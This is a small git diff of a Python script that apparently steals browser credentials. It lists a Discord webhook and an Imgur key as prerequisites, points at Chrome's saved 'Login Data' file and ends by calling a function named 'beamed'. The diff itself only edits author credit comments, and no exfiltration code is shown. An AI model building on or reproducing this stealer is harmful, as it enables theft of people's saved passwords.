@@ -18,10 +18,9 @@ from os import remove
 from sys import argv
 
 # prerequisites => discord webhook, imgur api key
-# lines to edit => 164, 166, 178  | replace: "placeholder"
 # author => lust, l-ust on github | https://www.github.com/l-ust
-# latest update by 2qk , 2qk on github
-# continiuation and progress by war, w6r on github
+# latest update by => 2qk , 2qk on github
+# continiuation and progress by => war, w6r on github
 
 
 DBP = r'Google\Chrome\User Data\Default\Login Data'
@@ -553,4 +552,3 @@ def beamed():
     	pass
 
 beamed()
-
